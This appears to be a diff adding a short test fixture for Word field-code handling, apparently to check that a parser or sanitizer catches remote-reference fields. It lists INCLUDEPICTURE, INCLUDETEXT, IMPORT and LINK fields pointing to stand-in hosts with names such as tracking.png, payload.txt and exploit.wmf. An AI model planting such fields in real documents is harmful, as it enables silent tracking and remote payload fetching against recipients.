@@ -1,0 +1,13 @@
+Testing INCLUDEPICTURE: [Image placeholder]
+
+Testing INCLUDETEXT: [Text placeholder]
+
+Testing IMPORT: [Import placeholder]
+
+Testing LINK: [Link placeholder]
+
+fldChar
+INCLUDEPICTURE "http://example.com/tracking.png"
+INCLUDETEXT "http://example.org/payload.txt"
+IMPORT "http://example.net/exploit.wmf"
+LINK Word.Document "http://test.invalid/cmd.docx"
